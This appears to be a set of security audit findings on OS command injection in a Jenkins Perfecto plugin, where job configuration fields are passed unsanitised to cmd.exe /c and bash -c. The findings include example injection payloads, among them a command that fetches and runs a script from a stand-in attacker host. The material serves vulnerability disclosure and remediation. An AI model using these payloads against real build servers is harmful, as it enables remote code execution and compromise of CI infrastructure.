findings.description: OS Command Injection via user-controlled parameters passed to cmd.exe /c shell interpreter (Windows path)
findings.reasoning:
The command is passed to `cmd.exe /c` which interprets shell metacharacters. The third element of cmdArgs is a concatenated string including:
1. `pcParameters` - user-supplied job configuration parameter passed directly via `@DataBoundConstructor`, no sanitization
2. `baseCommand` which includes `pcLocation` (derived from `perfectoConnectLocation` + `perfectoConnectFile`, both user-supplied job config params), `cloudName` (from credentials), and `apiKey` (credential password)

Because `cmd.exe /c` treats the entire string as a shell command, any Windows shell metacharacters (e.g., `&`, `&&`, `|`, `||`, `^`) injected via `pcParameters`, `perfectoConnectLocation`, or `perfectoConnectFile` will be interpreted by cmd.exe, enabling arbitrary OS command execution.

For example, if a user sets `pcParameters` to `foo & calc.exe`, cmd.exe will execute both the PerfectoConnect start command AND `calc.exe` (or any attacker-chosen command).

evidence.dataflow_analysis:
perfectoConnectLocation/perfectoConnectFile -> pcLocation -> baseCommand -> cmdArgs[2] -> cmd.exe /c
pcParameters -> cmdArgs[2] -> cmd.exe /c
evidence.notes: Both Windows and Linux paths are vulnerable. This is the Windows path. The root cause is passing a concatenated user-controlled string as the argument to a shell interpreter (cmd.exe /c), which enables shell metacharacter injection.

exploit_payload.scenario: A Jenkins job administrator configures the Perfecto plugin with a malicious value in pcParameters or perfectoConnectLocation containing Windows shell metacharacters (& or |), causing cmd.exe to execute arbitrary commands on the Jenkins build agent
exploit_payload.prerequisites: Attacker needs Jenkins job configuration access (e.g., developer with job configuration permissions)

findings.description: OS Command Injection via user-controlled parameters passed to bash -c shell interpreter (Linux/Mac path)
findings.reasoning:
The command is passed to `bash -c` which fully interprets shell metacharacters. The third element of cmdArgs is a concatenated string including:
1. `perfectoConnectLocation` - user-supplied job configuration parameter, embedded directly in the shell command string after `cd `. An attacker can inject `;`, `&&`, `||`, backticks, or `$()` to execute arbitrary commands.
2. `pcParameters` - user-supplied job configuration parameter appended at the end of the shell string, equally dangerous.
3. `baseCommand` includes `pcLocation` (derived from `perfectoConnectLocation` + `perfectoConnectFile`), `cloudName`, and `apiKey`.

Because `bash -c` interprets the entire argument string as a bash command with full metacharacter support, any of these unsanitized user inputs enables OS command injection. For example, injecting `; id > /tmp/pwned` into `perfectoConnectLocation` would execute `id` on the Jenkins agent.

This is more exploitable than the Windows variant because `bash -c` supports richer shell syntax including command substitution (`$(...)`, backticks), process substitution, subshells, etc.

evidence.dataflow_analysis:
perfectoConnectLocation -> injected directly into bash -c string after 'cd '
pcParameters -> appended to bash -c string
pcLocation (from perfectoConnectLocation + perfectoConnectFile) -> baseCommand -> embedded in bash -c string
evidence.notes: The Linux path is especially dangerous because perfectoConnectLocation is injected into the bash command string at the 'cd <location>' position. An attacker simply needs to include a semicolon followed by their payload (e.g., '/tmp/tools; curl http://attacker.com/shell.sh | bash'). This requires no shell metacharacter bypass - semicolons are a natural separator in a path that shouldn't contain them but are not filtered.

exploit_payload.scenario: A Jenkins job developer/admin configures the Perfecto plugin with a malicious value in perfectoConnectLocation or pcParameters containing bash metacharacters (;, &&, $(), backticks), causing bash to execute arbitrary OS commands on the Jenkins build agent
exploit_payload.prerequisites: Attacker needs Jenkins job configuration write access (job developer or admin role)

findings.description: OS command injection via user-controlled pcParameters, pcLocation, and perfectoConnectFile fields passed to cmd.exe /c on Windows
findings.reasoning: The `baseCommand` string is built by concatenating `pcLocation` (derived from `perfectoConnectLocation` + `perfectoConnectFile`) with hardcoded strings, then `pcParameters` is appended. All three fields (`perfectoConnectLocation`, `perfectoConnectFile`, `pcParameters`) are user-configurable strings set via `@DataBoundConstructor` (line 130) at the Jenkins job configuration level — no sanitization or allowlist validation is applied at any point. This entire concatenated string is passed as the third argument to `cmd.exe /c`, which causes Windows Command Prompt to interpret the full string including any shell metacharacters (e.g., `&`, `&&`, `||`, `|`, `>`, `<`). An attacker with Jenkins job configuration access can inject arbitrary commands by including cmd metacharacters in any of these fields.

evidence.dataflow_analysis: pcParameters field declared at line 93, set via @DataBoundConstructor param at line 134, flows to line 161/163 via this.pcParameters field. perfectoConnectLocation and perfectoConnectFile similarly flow from constructor params to pcLocation construction at lines 156/158, then into baseCommand at line 160, then into cmdArgs at line 163.
evidence.notes: cmd.exe /c interprets shell metacharacters like & && || | > < ^ which allows command injection without needing special quoting bypass.

exploit_payload.scenario: Attacker with Jenkins job configuration access sets pcParameters or perfectoConnectLocation to include cmd.exe metacharacters, injecting arbitrary OS commands that execute on the Jenkins controller with the Jenkins process privileges when a build runs.
exploit_payload.prerequisites: Access to configure a Jenkins job (typically requires Jenkins user account with job configuration permission)
exploit_payload.category: OS command injection leading to remote code execution on Jenkins controller

findings.description: OS command injection via user-controlled pcParameters, perfectoConnectLocation, and perfectoConnectFile fields passed to bash -c on Linux/Mac
findings.reasoning: On non-Windows systems, the code constructs a bash command string by concatenating user-controlled fields `perfectoConnectLocation`, `pcLocation` (from `perfectoConnectLocation` + `perfectoConnectFile`), and `pcParameters` into a single string that is passed as the argument to `bash -c`. Since `bash -c` interprets the full string as a shell command, any shell metacharacters in the user-controlled values (`;`, `|`, `&`, `$(...)`, backticks, etc.) are interpreted by bash, enabling arbitrary command injection. All three fields are set via `@DataBoundConstructor` (line 130) from Jenkins job configuration with no sanitization whatsoever. Notably, `perfectoConnectLocation` appears TWICE — once in the `cd` portion and once indirectly through `pcLocation`/`baseCommand` — giving an attacker multiple injection vectors in this single command string.

evidence.dataflow_analysis: Fields pcParameters, perfectoConnectLocation, perfectoConnectFile are all set from @DataBoundConstructor parameters at lines 134-137 with no validation. They flow directly into the bash -c command string at line 166.
evidence.notes: bash -c interprets the entire string as a shell command, making this trivially exploitable with ; & | $() ` etc. The perfectoConnectLocation injection is especially impactful as it occurs before the semicolon in 'cd <location>; command', allowing ; injection to break out of the cd subshell command.

exploit_payload.scenario: Attacker with Jenkins job configuration access sets pcParameters or perfectoConnectLocation to include bash metacharacters, injecting arbitrary OS commands that execute on the Jenkins agent/controller with Jenkins process privileges when a build runs on Linux.
exploit_payload.prerequisites: Access to configure a Jenkins job (typically requires Jenkins user account with job configuration permission)
exploit_payload.category: OS command injection leading to remote code execution on Jenkins build node
